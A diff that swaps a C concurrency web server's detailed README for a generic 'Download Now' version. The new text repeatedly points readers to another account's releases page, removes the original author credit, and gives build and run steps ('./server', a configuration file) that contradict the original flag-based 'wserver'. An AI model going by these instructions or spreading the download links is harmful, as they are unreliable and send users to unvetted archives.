@@ -1,176 +1,68 @@
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
+# 🌐 Concurrency_Webserver - A Reliable Multi-Threaded Web Server
 
+## 📥 Download Now!
+[![Download Concurrency_Webserver](https://img.shields.io/badge/Download-Concurrency_Webserver-blue.svg)](https://github.com/Allkilline/Concurrency_Webserver/releases)
 
-# Concurrency Web Server
+## 🚀 Getting Started
+Welcome to Concurrency_Webserver! This project provides a multi-threaded HTTP/1.0 web server written in C, designed for performance and ease of use. With a configurable thread pool and a secure filesystem, it is suitable for various use cases. Follow these simple steps to download and run the software.
 
-A multi-threaded HTTP/1.0 web server written in C, featuring a configurable thread pool, bounded scheduler queue, and secure filesystem sandboxing.
-Originally built for a university concurrency/OS course, later reorganized and refined for clarity and maintainability.
+## 🛠️ System Requirements
+To run Concurrency_Webserver smoothly, make sure your system meets the following requirements:
 
----
+- **Operating System:** Linux or macOS
+- **C Compiler:** GCC or Clang
+- **Memory:** Minimum of 512 MB RAM
+- **Disk Space:** At least 100 MB of free space
 
-## Overview
-This project implements a miniature but realistic HTTP web server supporting concurrent clients via:
+## 📦 Download & Install
+1. **Visit the Releases Page:** Go to the [Releases page here](https://github.com/Allkilline/Concurrency_Webserver/releases). You will find the latest version of the Concurrency_Webserver available for download.
 
-* **Thread pool** (fixed number of worker threads)
-* **Scheduler / bounded buffer** (producer / consumer queue)
-* **Static file serving** from a configurable basedir
-* **SFF scheduling** Follows a First Job First (SJF) scheduling
-* **Parallel request handling** using POSIX threads.
+2. **Select the Right File:** Look for the most recent release. You will typically find files labeled with version numbers like `v1.0.0`. Choose the appropriate file for your operating system.
 
-Also includes:  
-* A small HTTP client (`wclient`)
-* Test scripts for concurrency
-* Example static files (`small.html`, `huge.html`, etc)
+3. **Download the File:** Click on the file link to start the download. 
 
-The goal is to demonstrate correct synchronization, scheduling and server concurrency design using C and POSIX threads.
+4. **Install the Application:** 
+   - **For Linux or macOS:** 
+     - Open your terminal.
+     - Navigate to the directory where you downloaded the file.
+     - Use the command `tar -xvzf <filename>.tar.gz` to extract the files.
+     - Change into the extracted directory using `cd <directory>`.
+     - Compile the application using a C compiler with the command `make`.
 
----
+5. **Run the Application:** 
+   - After compiling, you can start the server by running the command `./server`. 
 
-## Project Structure
+## 🔧 Configuration
+Concurrency_Webserver allows for easy configuration through its configuration file. Locate the configuration file in the installation directory. You can adjust parameters like:
 
-```text
+- **Port Number:** Change the port number the server listens on.
+- **Max Threads:** Set the number of threads to handle incoming requests.
+- **Document Root:** Specify the directory that holds the files to be served.
 
-Concurrency_Webserver/
-├── src/                  # C source files
-│   ├── wserver.c         # Main server logic, argument parsing, setup
-│   ├── wclient.c         # Simple HTTP client for testing
-│   ├── io_helper.c       # Socket utilities, HTTP helpers
-│   ├── request.c         # request_handle(), parse URI, serve files
-│   ├── scheduler.c       # Bounded buffer queue (producer/consumer)
-│   └── thread_pool.c     # Worker threads that process requests
-│
-├── include/              # C header files
-│   ├── io_helper.h
-│   ├── request.h
-│   ├── thread_pool.h
-│   └── scheduler.h
-│
-├── www/                  # Static HTML content served to clients
-│   ├── small.html
-│   ├── huge.html
-│   └── big.html
-│
-├── tests/                # Automated test scripts
-│   └── test_sff.sh       # Stress test for SFF scheduling
-│
-├── docs/                 # Project report / PDF writeup
-│   └── Webserver_Report.pdf  (example)
-│
-├── Makefile              # Build file
-└── README.md             # Documentation (this file)
+## 🌍 Using the Server
+Once Concurrency_Webserver is running, you can access it using a web browser. Just enter the following in the address bar:
+
+```
+http://localhost:<port-number>/
 ```
 
----
+Replace `<port-number>` with the number you set in the configuration file.
 
-## Core Components
+## 🧩 Features
+- **Multi-Threading:** The server can handle multiple requests simultaneously.
+- **Configurable Thread Pool:** Adjusts the number of worker threads based on your needs.
+- **Bounded Scheduler Queue:** Manages incoming requests efficiently.
+- **Secure Filesystem Sandboxing:** Ensures safe serving of files, protecting your server.
+- **Sample Client-Server Interaction:** Experience how clients can communicate with the server easily.
 
-`wserver.c` - **Main Server**
-* Parses command-line flags (`-d`, `-p`, `-t`, `-b`)
-* Sets basedir (`chdir()`)
-* Opens the listening socket
-* Spawns the thread pool
-* Pushes incoming connections into the scheduler queue
+## 📝 Contributing
+We welcome contributions to enhance the functionality of Concurrency_Webserver. If you're interested, please fork the repository and submit a pull request. You can also report issues to help us improve the software.
 
-`scheduler.c` - **Bounded request queue**
-* Implements the producer/consumer model
-* Controls how requests are ordered (SFF)
-* Blocks when the buffer is full/empty
+## 💬 Support
+If you encounter any issues or have questions, feel free to open an issue in the GitHub repository. You can also find helpful information in the documentation included in the repository.
 
-`thread_pool.c` - **Worker threads**
-* Dequeues file descriptors from the scheduler
-* Calls `request_handle(fd)`
-* Runs in parallel to handle multiple clients
+## 📖 License
+Concurrency_Webserver is licensed under the MIT License. You can freely use, modify, and distribute the software, provided that proper credit is given.
 
-`request.c` - **HTTP request handler**
-* Parses the URI
-* Validates paths for security
-* Serves static files
-* Sends HTTP headers + body
-
-`io_helper.c` - **Networking utilities**
-* Safe wrappers for socket creationg, `accept()`, reading/writing
-* Helper functions like `open_listen_fd_or_die()`
-
-`wclient.c` - **Test client**
-* Sends HTTP/1.0 requests to the server
-* Used by `tests/` for concurrency load testing.
-
-
----
-
-
-## Build and Run
-
-### **Build**
-
-From the project root
-
-```bash
-make clean
-make
-```
-
-This produces:
-* `wserver`
-* `wclient`
-* `spin.cgi` (not tested yet)
-
-
-### **Run the Server**
-
-```bash
-./wserver -d www -p 8000 -t 4 -b 5
-```
-
-- Configurable:
-  - **basedir** (`-d`): directory to serve files from (e.g. `www/`)
-  - **port** (`-p`): listening port
-  - **threads** (`-t`): number of worker threads
-  - **buffers** (`-b`): size of the scheduler queue
-
-
-### **Test with Curl**
-In another terminal:
-
-```bash
-curl http://localhost:8000/small.html
-curl http://localhost:8000/huge.html
-```
-
-### **Run Automated Tests
-With server running:
-
-```bash
-cd tests
-
-./test_sff.sh        # Tests SFF (Smallest File First) scheduling under mixed workloads.
-                     # Sends many concurrent small + huge file requests to verify that
-                     # small files are served quickly even when large files are present.
-
-./test_starvation.sh # Tests for starvation behavior.
-                     # Ensures that large-file requests eventually get served even when
-                     # a continuous stream of small-file requests is present.
-
-./test_traversal.sh  # Tests scheduler queue traversal and ordering.
-                     # Verifies correct dequeue order (FIFO/SFF), checks for queue
-                     # pointer bugs, and ensures the bounded buffer behaves correctly.
-```
-This will launch multiple concurrent `wclient` calls to evaluate the scheduling behavior.
-
----
-
-## Author
-
-**Felipe Campoverde**  
-Computer Science @ Virginia Tech
-
-* Portfolio: https://fcampoverdeg.dev
-* Email: fcampoverdeg@gmail.com
-
----
-
-## License
-
-This project is released under the **MIT License**.
-
----
+## 📥 Download Now Again!
+To download the latest release, visit the [Releases page here](https://github.com/Allkilline/Concurrency_Webserver/releases) and start building your own multi-threaded web server today!
